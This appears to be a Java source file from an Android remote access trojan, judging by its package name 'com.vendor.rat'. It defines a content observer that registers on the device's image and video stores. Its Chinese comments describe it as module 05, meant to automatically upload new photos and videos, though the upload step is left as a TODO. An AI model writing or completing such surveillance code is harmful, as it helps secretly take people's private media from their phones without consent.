package com.vendor.rat.data.observer;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.provider.MediaStore;
import android.util.Log;

/**
 * 相册内容监听器 (模块 05)
 *
 * 监听相册变化，自动上传新增照片/视频
 */
public class PhotoAlbumContentObserver extends ContentObserver {

    private static final String TAG = "PhotoAlbumObserver";
    private final Context context;

    public PhotoAlbumContentObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    /**
     * 注册监听
     */
    public void register() {
        context.getContentResolver().registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true, this
        );
        context.getContentResolver().registerContentObserver(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            true, this
        );
        Log.d(TAG, "Photo album observer registered");
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        Log.d(TAG, "Media changed: " + uri);
        // TODO: 检测新增文件并加入上传队列
    }
}
